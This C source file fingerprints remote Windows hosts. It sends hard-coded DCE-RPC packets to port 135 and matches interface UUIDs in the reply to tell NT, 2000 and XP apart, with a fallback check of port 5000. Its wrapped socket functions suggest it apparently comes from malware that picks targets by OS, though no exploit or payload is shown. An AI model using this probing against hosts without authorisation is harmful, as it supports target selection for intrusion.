#include "includes.h"
#include "functions.h"
#include "externs.h"

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];

			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET)
				return OS_UNKNOWN;

			SOCKADDR_IN ssin;
			memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135);
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);

			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) {
					fclosesocket(sSocket);
					return iRetVal;
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) {
					fclosesocket(sSocket);
					return iRetVal;
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) {
						fclosesocket(sSocket);
						return iRetVal;
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) {
						fclosesocket(sSocket);
						return iRetVal;
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {
							if(iErr<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						} else
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN;
					} else {
						fclosesocket(sSocket);
						return iRetVal;
					}
				} else {
					fclosesocket(sSocket);
					return iRetVal;
				}
			} else {
				fclosesocket(sSocket);
				return iRetVal;
			}
			fclosesocket(sSocket);
			return iRetVal;
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break;
	}
	return OS_UNKNOWN;
}
